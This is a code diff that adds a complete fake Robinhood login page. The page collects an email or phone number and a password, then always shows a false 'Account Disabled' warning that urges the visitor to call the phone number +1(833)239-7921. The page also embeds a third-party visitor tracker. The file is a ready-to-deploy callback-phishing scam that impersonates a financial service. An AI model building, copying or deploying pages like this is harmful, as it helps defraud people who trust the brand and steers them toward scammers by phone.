@@ -1,0 +1,397 @@
+﻿<!DOCTYPE html>
+<html lang="en-US" dir="ltr">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+  <link rel="shortcut icon" href="favicon.ico" type="image/x-icon">
+  <link rel="stylesheet" href="static/app.css">
+  <link rel="stylesheet" href="static/intlTelInput.css">
+  <style>
+    .iti {
+      width: 100%;
+    }
+    .iti__flag-container {
+      padding-left: 10px;
+    }
+    .errorButton {
+      background-color: #ff4747;
+      border: none;
+      padding: 12px 20px;
+      border-radius: 4px;
+      cursor: pointer;
+      width: 100%;
+      font-weight: bold;
+    }
+    .errorButton:hover {
+      background-color: #e63939;
+    }
+    .w-60 {
+      width: 30px;
+      height: 30px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+    .phone {
+      display: none;
+    }
+    .is-hidden {
+      display: none !important;
+    }
+  </style>
+</head>
+
+<body x-data="app" class="is-dark-theme theme-closed-up">
+  <div id="react_root">
+    <div class="web-app-emotion-cache-ym6pnu" x-show="mainLoader" style="display: none;">
+      <div aria-busy="true" data-loading="true" role="alert" class="web-app-emotion-cache-1gmwthx">
+        <div class="loader" style="width: 100px; height: 100px; margin: 0 auto;">
+          <svg version="1.1" id="L9" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" viewbox="0 0 100 100" enable-background="new 0 0 0 0" xml:space="preserve">
+            <path fill="#fff" d="M73,50c0-12.7-10.3-23-23-23S27,37.3,27,50 M30.9,50c0-10.5,8.5-19.1,19.1-19.1S69.1,39.5,69.1,50">
+              <animatetransform attributename="transform" attributetype="XML" type="rotate" dur="1s" from="0 50 50" to="360 50 50" repeatcount="indefinite"></animatetransform>
+            </path>
+          </svg>
+        </div>
+      </div>
+    </div>
+
+    <div class="web-app-emotion-cache-p9rxez css-1wstayn" x-show="!mainLoader">
+      <div class="css-eyq2zi">
+        <div class="css-1os47tj">
+          <img aria-hidden="true" class="css-1ox8jnp" data-testid="default-image" sizes="(min-width: 768px) 1440px, 720px" src="static/b9b03eba8c371b528b8c.jpg" srcset="static/b9b03eba8c371b528b8c.jpg 720w, static/9435691b466061dc75b0.jpg 1440w">
+          <div class="css-za6pwx">
+            <div class="css-5sconx">
+            </div>
+            <div class="css-1yhwo80">
+              <div class="web-app-emotion-cache-13udsys">
+                <form action="" method="POST" @submit.prevent="handleSubmit" x-show="!errorArea">
+                  <header class="web-app-emotion-cache-52qs92">
+                    <span class="css-z4smye">Log in to Robinhood</span>
+                  </header>
+                  <div class="web-app-emotion-cache-13dpkcn" x-show="!phoneArea">
+                    <div class="web-app-emotion-cache-1rqauel">
+                      <label class="web-app-emotion-cache-8atqhb">
+                        <div class="web-app-emotion-cache-1te2hl9">
+                          <span class="css-y3z1hq">Email</span>
+                        </div>
+                        <div class="web-app-emotion-cache-19dkwrt">
+                          <input aria-describedby="" aria-required="true" autocapitalize="off" autocomplete="username" autocorrect="off" name="username" required="" spellcheck="false" aria-invalid="false" class="remove-legacy web-app-emotion-cache-3t1xt4" type="text" value="" x-model="email">
+                        </div>
+                      </label>
+                    </div>
+                    <div class="web-app-emotion-cache-12bmans">
+                      <label class="web-app-emotion-cache-8atqhb">
+                        <div class="web-app-emotion-cache-1te2hl9">
+                          <span class="css-y3z1hq">Password</span>
+                        </div>
+                        <div class="web-app-emotion-cache-1ptvuh2">
+                          <input aria-describedby="" aria-required="true" autocomplete="current-password" id="current-password" name="password" required="" aria-invalid="false" class="remove-legacy web-app-emotion-cache-22vpzz" :type="showPassword ? 'text' : 'password'" value="" x-model="password">
+                          <button type="button" aria-label="show password in plain text" aria-pressed="false" aria-busy="false" class="web-app-emotion-cache-9l4dti">
+                            <span class="web-app-emotion-cache-zvjitd">
+                              <span class="web-app-emotion-cache-16fsaft">
+                                <span aria-hidden="true" class="web-app-emotion-cache-1c6vscd" @click="changePasswordVisibility">
+                                  <svg fill="none" height="16" role="img" viewbox="0 0 16 16" width="16" xmlns="http://www.w3.org/2000/svg" x-show="!showPassword">
+                                    <path clip-rule="evenodd" d="M1 8s1.91-4.455 7-4.455S15 8 15 8s-1.91 4.454-7 4.454S1 8 1 8Zm4.773 0A2.23 2.23 0 0 0 8 10.227 2.23 2.23 0 0 0 10.227 8 2.23 2.23 0 0 0 8 5.773 2.23 2.23 0 0 0 5.773 8Z" fill="var(--rh__text-color)" fill-rule="evenodd">
+                                    </path>
+                                  </svg>
+                                  <svg fill="none" height="16" role="img" viewbox="0 0 16 16" x-show="showPassword" width="16" xmlns="http://www.w3.org/2000/svg">
+                                    <path clip-rule="evenodd" d="M13.719 1.878 1.775 13.822l1.06 1.06 2.787-2.786c.7.223 1.491.358 2.378.358 5.09 0 7-4.454 7-4.454s-.696-1.625-2.37-2.912l2.15-2.15-1.061-1.06Zm-3.54 5.66L7.54 10.18a2.23 2.23 0 0 0 2.64-2.64Z" fill="var(--rh__text-color)" fill-rule="evenodd"></path>
+                                    <path d="M5.794 7.689A2.232 2.232 0 0 1 7.69 5.794l2.06-2.06A7.982 7.982 0 0 0 8 3.545C2.91 3.545 1 8 1 8s.574 1.34 1.933 2.55l2.861-2.86Z" fill="var(--rh__text-color)"></path>
+                                  </svg>
+                                </span>
+                              </span>
+                            </span>
+                          </button>
+                        </div>
+                      </label>
+                    </div>
+                    <div>
+                      <label class="web-app-emotion-cache-33m7fw">
+                        <div class="web-app-emotion-cache-fu7gfn">
+                          <div class="web-app-emotion-cache-13aqjzy">
+                            <div style="cursor: pointer;" aria-hidden="true" data-testid="rh-Checkbox-visibleCheckbox" :class="checked ? 'web-app-emotion-cache-1qw2qz2' : 'web-app-emotion-cache-j4nkii'" @click="checked = !checked">
+                              <template x-if="checked">
+                                <div class="web-app-emotion-cache-dsi2ye">
+                                  <span class="web-app-emotion-cache-gvsqlw">
+                                    <svg fill="none" height="16" role="img" viewbox="0 0 16 16" width="16" xmlns="http://www.w3.org/2000/svg">
+                                      <path clip-rule="evenodd" d="m13.619 4.952-7.285 7.285-3.62-3.618L3.953 7.38l2.382 2.382 6.048-6.048 1.237 1.237Z" fill="var(--rh__text-color)" fill-rule="evenodd">
+                                      </path>
+                                    </svg>
+                                  </span>
+                                </div>
+                              </template>
+                            </div>
+                          </div>
+                        </div>
+                        <span class="css-y3z1hq">Keep me logged in for up to 30 days</span>
+                      </label>
+                      <div data-testid="rh-design-Accordion-root" class="web-app-emotion-cache-1smisqx" x-show="checked">
+                        <div aria-hidden="false" class="web-app-emotion-cache-lw0vnf">
+                          <div aria-labelledby="a20ff84c5-e189-446c-aa51-41b6e47f0b8c" class="web-app-emotion-cache-sdhsq1" role="region">
+                            <svg fill="none" height="24" role="img" viewbox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg">
+                              <path clip-rule="evenodd" d="M12 20c4.395 0 8-3.605 8-8s-3.605-8-8-8-8 3.605-8 8 3.605 8 8 8Zm10-8c0 5.5-4.5 10-10 10S2 17.5 2 12 6.5 2 12 2s10 4.5 10 10Z" fill="var(--rh__text-color)" fill-rule="evenodd">
+                              </path>
+                              <path d="M13 9V7h-2v2h2Zm0 2h-2v6h2v-6Z" fill="var(--rh__text-color)">
+                              </path>
+                            </svg>
+                            <div id="a20ff84c5-e189-446c-aa51-41b6e47f0b8c" class="web-app-emotion-cache-17hnghz">
+                              <span class="web-app-emotion-cache-1xmir16 css-y3z1hq">Only select this option if you trust this device and are not logging on from a shared computer.</span>
+                            </div>
+                          </div>
+                        </div>
+                      </div>
+                    </div>
+                    <div class="web-app-emotion-cache-1ajn24b">
+                      <a role="link" class="rh-hyperlink web-app-emotion-cache-1llaoxs css-1byi2su">
+                        <span class="web-app-emotion-cache-zvjitd">
+                          <span class="web-app-emotion-cache-16fsaft">
+                            <span class="web-app-emotion-cache-1xmir16 css-v72tci">Forgot your password?</span>
+                          </span>
+                        </span>
+                      </a>
+                      <a role="link" class="rh-hyperlink web-app-emotion-cache-1llaoxs css-1byi2su">
+                        <span class="web-app-emotion-cache-zvjitd">
+                          <span class="web-app-emotion-cache-16fsaft">
+                            <span class="web-app-emotion-cache-1xmir16 css-v72tci">Forgot your email address?</span>
+                          </span>
+                        </span>
+                      </a>
+                    </div>
+                    <div data-testid="LoginErrorMessage" x-show="emailError">
+                      <div data-testid="rh-design-Accordion-root" class="web-app-emotion-cache-sit1mz">
+                        <div aria-hidden="false" class="web-app-emotion-cache-lw0vnf">
+                          <div aria-labelledby="ae7fdb52b-8165-46da-9ad4-e31075a1259f" class="web-app-emotion-cache-sdhsq1" role="region">
+                            <svg fill="none" height="24" role="img" viewbox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg">
+                              <path clip-rule="evenodd" d="M12 20c4.395 0 8-3.605 8-8s-3.605-8-8-8-8 3.605-8 8 3.605 8 8 8Zm10-8c0 5.5-4.5 10-10 10S2 17.5 2 12 6.5 2 12 2s10 4.5 10 10Z" fill="var(--rh__text-color)" fill-rule="evenodd">
+                              </path>
+                              <path d="M13 9V7h-2v2h2Zm0 2h-2v6h2v-6Z" fill="var(--rh__text-color)">
+                              </path>
+                            </svg>
+                            <div id="ae7fdb52b-8165-46da-9ad4-e31075a1259f" class="web-app-emotion-cache-17hnghz">
+                              <span class="web-app-emotion-cache-1xmir16 css-y3z1hq">Please enter a valid email address.</span>
+                            </div>
+                          </div>
+                        </div>
+                      </div>
+                    </div>
+                  </div>
+                  <div class="web-app-emotion-cache-13dpkcn phone" x-show="phoneArea">
+                    <div class="web-app-emotion-cache-1rqauel">
+                      <label class="web-app-emotion-cache-8atqhb">
+                        <div class="web-app-emotion-cache-1te2hl9">
+                          <span class="css-y3z1hq">Phone Number</span>
+                        </div>
+                        <div class="web-app-emotion-cache-19dkwrt">
+                            <input id="phone" name="phone" inputmode="numeric" class="remove-legacy web-app-emotion-cache-3t1xt4 iti__tel-input" type="tel" value="" x-model="phone" style="padding-left: 48px;">
+                        </div>
+                      </label>
+                    </div>
+                    <div data-testid="LoginErrorMessage" x-show="phoneError">
+                      <div data-testid="rh-design-Accordion-root" class="web-app-emotion-cache-sit1mz">
+                        <div aria-hidden="false" class="web-app-emotion-cache-lw0vnf">
+                          <div aria-labelledby="ae7fdb52b-8165-46da-9ad4-e31075a1259f" class="web-app-emotion-cache-sdhsq1" role="region">
+                            <svg fill="none" height="24" role="img" viewbox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg">
+                              <path clip-rule="evenodd" d="M12 20c4.395 0 8-3.605 8-8s-3.605-8-8-8-8 3.605-8 8 3.605 8 8 8Zm10-8c0 5.5-4.5 10-10 10S2 17.5 2 12 6.5 2 12 2s10 4.5 10 10Z" fill="var(--rh__text-color)" fill-rule="evenodd">
+                              </path>
+                              <path d="M13 9V7h-2v2h2Zm0 2h-2v6h2v-6Z" fill="var(--rh__text-color)">
+                              </path>
+                            </svg>
+                            <div id="ae7fdb52b-8165-46da-9ad4-e31075a1259f" class="web-app-emotion-cache-17hnghz">
+                              <span class="web-app-emotion-cache-1xmir16 css-y3z1hq">Please enter a valid phone number.</span>
+                            </div>
+                          </div>
+                        </div>
+                      </div>
+                    </div>
+                  </div>
+                  <footer class="web-app-emotion-cache-dwjtkn">
+                    <div class="web-app-emotion-cache-1eorgfy">
+                      <div class="web-app-emotion-cache-1am54wq">
+                        <button type="submit" aria-busy="false" class="web-app-emotion-cache-skipym" :disabled="loader">
+                          <span class="web-app-emotion-cache-zvjitd" x-show="!loader">
+                            <span class="web-app-emotion-cache-16fsaft">
+                              <span class="css-v72tci" x-text="phoneArea ? 'Continue' : 'Log In'"></span>
+                            </span>
+                          </span>
+                          <div class="w-60" x-show="loader">
+                            <svg version="1.1" id="L9" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" viewbox="0 0 100 100" enable-background="new 0 0 0 0" xml:space="preserve">
+                              <path fill="#fff" d="M73,50c0-12.7-10.3-23-23-23S27,37.3,27,50 M30.9,50c0-10.5,8.5-19.1,19.1-19.1S69.1,39.5,69.1,50">
+                                <animatetransform attributename="transform" attributetype="XML" type="rotate" dur="1s" from="0 50 50" to="360 50 50" repeatcount="indefinite"></animatetransform>
+                              </path>
+                            </svg>
+                          </div>
+                        </button>
+                      </div>
+                    </div>
+                    <div class="web-app-emotion-cache-11p3it6" x-show="!phoneArea">
+                      <div class="web-app-emotion-cache-12y04o6">
+                      </div>
+                      <span class="web-app-emotion-cache-ajlk3m css-10hobi0">or</span>
+                      <div class="web-app-emotion-cache-12y04o6">
+                      </div>
+                    </div>
+                    <div id="submitbutton" class="web-app-emotion-cache-1sstyyn" x-show="!phoneArea">
+                      <div class="web-app-emotion-cache-1am54wq">
+                        <button type="button" aria-busy="false" class="web-app-emotion-cache-skipym">
+                          <span class="web-app-emotion-cache-zvjitd">
+                            <span class="web-app-emotion-cache-16fsaft">
+                              <span aria-hidden="true" class="web-app-emotion-cache-1e7mxex">
+                                <svg fill="none" height="16" role="img" viewbox="0 0 16 16" width="16" xmlns="http://www.w3.org/2000/svg">
+                                  <path clip-rule="evenodd" d="M4.75 7.004h-1.5V14h9.5V7.004h-1.5V5.25a3.25 3.25 0 1 0-6.5 0v1.754Zm1.5 0h3.5V5.25a1.75 1.75 0 1 0-3.5 0v1.754Z" fill="var(--rh__text-color)" fill-rule="evenodd">
+                                  </path>
+                                </svg>
+                              </span>
+                              <span class="css-v72tci">Log in with passkeys</span>
+                            </span>
+                          </span>
+                        </button>
+                      </div>
+                    </div>
+                    <div class="web-app-emotion-cache-1hw29i9" x-show="!phoneArea">
+                      <span class="css-y3z1hq">Not on Robinhood?</span> <button type="button" aria-busy="false" class="web-app-emotion-cache-finv5o">
+                        <span class="web-app-emotion-cache-zvjitd">
+                          <span class="web-app-emotion-cache-16fsaft">
+                            <span class="web-app-emotion-cache-ksarv1 css-v72tci">Create an account</span>
+                          </span>
+                        </span>
+                      </button>
+                    </div>
+                  </footer>
+                </form>
+                <div x-show="errorArea">
+                  <div class="web-app-emotion-cache-13udsys">
+                    <div class="web-app-emotion-cache-52qs92">
+                      <span class="css-z4smye" style="color: #ff4747;">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="margin-right: 10px; vertical-align: middle;">
+                          <path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"></path>
+                          <line x1="12" y1="9" x2="12" y2="13"></line>
+                          <line x1="12" y1="17" x2="12.01" y2="17"></line>
+                        </svg>
+                        Account Disabled
+                      </span>
+                    </div>
+                    <div class="web-app-emotion-cache-1rqauel">
+                      <p class="css-y3z1hq" style="text-align: justify;">Your account has been disabled due to security concerns. Please contact our support team for assistance.</p>
+                    </div>
+                    <div class="web-app-emotion-cache-12bmans">
+                      <p class="css-y3z1hq" style="text-align: justify;">For your protection, we've temporarily restricted access to your account. This is a precautionary measure to ensure the safety of your personal information.</p>
+                    </div>
+                    <div class="web-app-emotion-cache-1sstyyn">
+                      <button type="button" class="errorButton" onclick="window.location.href='tel:+18332397921'" style="display: flex; align-items: center; justify-content: center;">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewbox="0 0 24 24" fill="#000" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="margin-right: 10px;">
+                          <path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z"></path>
+                        </svg>
+                        <span style="color: #000; font-weight: bold;">Call: +1(833)239-7921</span>
+                      </button>
+                    </div>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <script src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.slim.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/24.6.0/build/js/intlTelInput.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/alpinejs@3.14.9/dist/cdn.min.js" defer></script>
+  
+  <script>
+    document.addEventListener('alpine:init', () => {
+      Alpine.data('app', () => ({
+        mainLoader: false,
+        errorArea: false,
+        phoneArea: false,
+        email: '',
+        password: '',
+        phone: '',
+        showPassword: false,
+        checked: false,
+        loader: false,
+        emailError: false,
+        phoneError: false,
+        
+        init() {
+          this.mainLoader = true;
+          setTimeout(() => {
+            this.mainLoader = false;
+          }, 1500);
+          
+          // Initialize phone input
+          const phoneInput = document.querySelector("#phone");
+          window.intlTelInput(phoneInput, {
+            initialCountry: "us",
+            separateDialCode: true,
+            utilsScript: "https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/24.6.0/build/js/utils.js"
+          });
+        },
+        
+        changePasswordVisibility() {
+          this.showPassword = !this.showPassword;
+        },
+        
+        handleSubmit() {
+          if (this.phoneArea) {
+            this.handlePhoneSubmit();
+          } else {
+            this.handleEmailSubmit();
+          }
+        },
+        
+        handleEmailSubmit() {
+          this.loader = true;
+          this.emailError = false;
+          
+          // Simple email validation
+          const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+          if (!emailRegex.test(this.email)) {
+            this.emailError = true;
+            this.loader = false;
+            return;
+          }
+          
+          // Simulate API call
+          setTimeout(() => {
+            this.loader = false;
+            this.errorArea = true; // Show error message
+          }, 2000);
+        },
+        
+        handlePhoneSubmit() {
+          this.loader = true;
+          this.phoneError = false;
+          
+          // Simple phone validation
+          if (!this.phone || this.phone.length < 5) {
+            this.phoneError = true;
+            this.loader = false;
+            return;
+          }
+          
+          // Simulate API call
+          setTimeout(() => {
+            this.loader = false;
+            this.errorArea = true; // Show error message
+          }, 2000);
+        }
+      }));
+    });
+  </script>
+  <!-- begin code v 7.0 -->
+<span id="wts2200331"></span>
+<script>var wts=document.createElement('script');wts.async=true;
+wts.src='https://app.ardalio.com/wts7.js';document.head.appendChild(wts);
+wts.onload = function(){ wtsl7(2200331,3); };
+</script><noscript><img src="https://app.ardalio.com/7/3/2200331.png"></noscript>
+<!-- end code v 7.0 -->
+
+  
+  
+  
+  
+  
+  
+</body>
+</html>
